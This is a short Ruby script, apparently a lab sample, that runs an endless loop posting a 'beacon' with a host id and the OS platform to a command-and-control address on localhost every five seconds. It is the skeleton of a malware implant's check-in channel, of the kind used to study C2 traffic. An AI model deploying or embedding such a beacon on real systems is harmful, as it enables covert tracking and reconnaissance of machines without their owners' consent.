require "net/http"
require "json"

C2 = "http://127.0.0.1:9000"

loop do
  uri = URI("#{C2}/beacon")

  data = {
    id: "lab1",
    os: RUBY_PLATFORM
  }

  Net::HTTP.post(
    uri,
    data.to_json,
    "Content-Type" => "application/json"
  )

  sleep 5
end
